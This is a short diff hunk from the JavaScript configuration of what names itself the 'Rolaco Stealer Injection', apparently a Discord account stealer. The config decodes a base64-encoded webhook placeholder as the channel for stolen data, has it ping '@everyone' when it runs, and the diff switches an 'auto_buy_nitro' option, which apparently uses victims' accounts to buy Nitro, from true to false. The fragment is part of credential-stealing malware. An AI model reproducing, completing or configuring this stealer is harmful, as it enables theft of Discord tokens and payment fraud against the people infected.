@@ -9,7 +9,7 @@ const encodedHook = '%WEBHOOKHEREBASE64ENCODED%'
 const config = {
   webhook: atob(encodedHook),
   webhook_protector_key: '%WEBHOOK_KEY%',
-  auto_buy_nitro: true, 
+  auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: 'Rolaco Stealer Injection', 
